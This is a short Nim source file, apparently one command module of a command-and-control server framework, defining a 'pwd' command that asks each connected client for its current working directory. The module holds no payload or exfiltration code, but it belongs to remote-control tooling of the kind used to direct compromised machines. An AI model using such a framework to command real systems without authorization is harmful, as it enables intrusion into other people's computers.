import asyncdispatch, strutils, tables, json

import ../../types
import ../../logging
import ../../communication

proc execProc(cmd: Command, originalCommand: string, args: seq[string], flags: Table[string, string], server: C2Server) {.async.} =
  for client in server.cli.handlingClient:
    let task = await client.sendClientTask("pwd")
    if not task.isNil(): await task.awaitResponse()

let cmd*: Command = Command(
  execProc: execProc,
  name: "pwd",
  argsLength: 0,
  usage: @["pwd"],
  cliMode: @[ClientInteractMode],
  description: "Get current working directory",
  category: CCClientInteraction,
  requiresConnectedClient: true
)